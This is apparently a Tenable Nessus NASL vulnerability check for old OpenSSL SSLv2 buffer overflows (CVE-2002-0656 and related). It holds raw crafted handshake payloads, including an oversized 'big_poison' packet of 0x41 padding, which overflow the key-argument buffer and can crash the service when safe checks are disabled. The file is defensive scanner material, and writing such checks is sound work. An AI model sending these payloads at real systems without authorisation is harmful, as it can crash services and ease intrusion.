#
# (C) Tenable Network Security, Inc.
#

# Thanks to Solar Eclipse <solareclipse@phreedom.org>, who did most
# of the work.
#
# Will incidentally cover CVE-2001-1141 and CVE-2000-0535 
#  


include("compat.inc");

if(description)
{
 script_id(11060);
 script_version("$Revision: 1.37 $");
 
 script_cve_id("CVE-2002-0656", "CVE-2002-0655", "CVE-2002-0657", "CVE-2002-0659", "CVE-2001-1141");
 script_bugtraq_id(3004, 5361, 5362, 5363, 5364, 5366);
 script_xref(name:"IAVA", value:"2002-a-0004");
 script_xref(name:"OSVDB", value:"853");
 script_xref(name:"OSVDB", value:"857");
 script_xref(name:"OSVDB", value:"3940");
 script_xref(name:"OSVDB", value:"3941");
 script_xref(name:"OSVDB", value:"3942");
 script_xref(name:"OSVDB", value:"3943");
 script_xref(name:"SuSE", value:"SUSE-SA:2002:033");

 script_name(english:"OpenSSL < 0.9.6e / 0.9.7b3 Multiple Remote Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"The remote service uses a library that is affected by a buffer
overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote service seems to be using a version of OpenSSL that is
older than 0.9.6e or 0.9.7-beta3. 

Such versions are affected by a buffer overflow that may allow an
attacker to execute arbitrary commands on the remote host with the
privileges of the application itself." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to OpenSSL version 0.9.6e / 0.9.7beta3 or later.

If the remote service is Compaq Insight Manager, please visit
http://h18023.www1.hp.com/support/files/server/us/download/15803.html" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 script_summary(english:"Checks for the behavior of OpenSSL");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Solar Eclipse / Renaud Deraison");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl");
 script_require_keys("Transport/SSL");
 
 exit(0);
}

include("global_settings.inc");

if ( safe_checks() && report_paranoia < 2 ) exit(0);

#------------------------------ Consts ----------------------#
client_hello = raw_string(
0x80, 0x31, 0x01, 0x00, 
0x02,  0x00, 0x18,0x00, 
0x00,  0x00, 0x10,0x07, 
0x00, 0xC0, 0x05, 0x00, 
0x80, 0x03, 0x00, 0x80, 
0x01, 0x00, 0x80, 0x08, 
0x00, 0x80, 0x06, 0x00, 
0x40, 0x04, 0x00, 0x80, 
0x02, 0x00, 0x80, 0xE4, 
0xBD, 0x00, 0x00, 0xA4, 
0x41, 0xB6, 0x74, 0x71, 
0x2B, 0x27, 0x95, 0x44, 
0xC0, 0x3D, 0xC0);

			
poison = raw_string(
0x80,0x5a,0x2,0x7,
0x0,0xc0,0x0,0x0,
0x0,0x40,0x0,0x10,
0x19,0x53,0xf,0x55,
0x5e,0xaa,0x68,0x71,
0x3,0x27,0x4,0x5a,
0x1f,0x5,0xea,0x33,
0x29,0x5b,0xb9,0x3f,
0x7d,0x28,0xe6,0x4c,
0xd4,0xb3,0x8e,0x36,
0x44,0xb5,0x86,0x6c,
0x6c,0x6,0xc1,0x5c,
0x45,0x73,0xb8,0x11,
0x55,0x23,0x3e,0x2a,
0x52,0xe0,0x52,0x30,
0xda,0xf8,0xee,0x15,
0x79,0xe1,0x3c,0x68,
0x36,0xd1,0x14,0x26,
0xae,0xd4,0x30,0x2,
0x0,0x0,0x0,0x0,
0x4,0x0,0x0,0x0,
0x41,0x41,0x41,0x41,
0x41,0x41,0x41,0x41);


big_poison = raw_string(
0x81, 0xca, 0x2, 0x7, 
0x0, 0xc0, 0x0, 0x0, 
0x0, 0x40, 0x1, 0x80, 
0xa4, 0x20, 0xb4, 0x44, 
0xd, 0xe, 0x7c, 0x5, 
0xc2, 0x21, 0x28, 0x4d, 
0xd3, 0xab, 0x6b, 0x72, 
0x10, 0xa3, 0x64, 0x7e, 
0x9, 0x7e, 0xe8, 0x28, 
0xe, 0x98, 0x5a, 0x5, 
0x2f, 0x32, 0xbb, 0xa, 
0x3c, 0xe0, 0x58, 0x5a, 
0xc5, 0xf1, 0x91, 0x36, 
0x1a, 0x27, 0x2c, 0x37, 
0x4b, 0xc2, 0xd2, 0x49, 
0x28, 0xc4, 0xf1, 0x76, 
0x41, 0xe5, 0xa4, 0x2d, 
0xe6, 0x9a, 0x55, 0x7e, 
0x27, 0x38, 0x89, 0x13, 
0x0, 0x0, 0x0, 0x0, 
0x4, 0x0, 0x0, 0x0, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41, 
0x41, 0x41, 0x41, 0x41);



#-------- The code. We need the check what happens on each port ------------#

moderate_report = 
"Note that since safe checks are enabled, this check might be fooled by 
non-openssl implementations and produce a false positive.
In doubt, re-execute the scan without the safe checks";

port = get_kb_item("Transport/SSL");
if(!port) port = 443;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port, transport:ENCAPS_IP);
if(!soc)exit(0);
send(socket:soc, data:client_hello);
buf = recv(socket:soc, length:8192); 
if(!strlen(buf))exit(0);
send(socket:soc, data:poison);
buf = recv(socket:soc, length:10);
close(soc);
if(safe_checks())
{
if(strlen(buf) > 5)security_hole(port:port, extra: moderate_report);
}
else
{
 if(strlen(buf) > 5)
 {
  soc = open_sock_tcp(port, transport:ENCAPS_IP);
  if(!soc)exit(0);
  send(socket:soc, data:client_hello);
  buf = recv(socket:soc, length:8192);
  if(!strlen(buf))exit(0);
  n = send(socket:soc, data:big_poison);
  if ( n != strlen(big_poison) ) exit(0);

  buf = recv(socket:soc, length:4096);
  close(soc);
  if(strlen(buf) == 0)security_hole(port);
 }
}
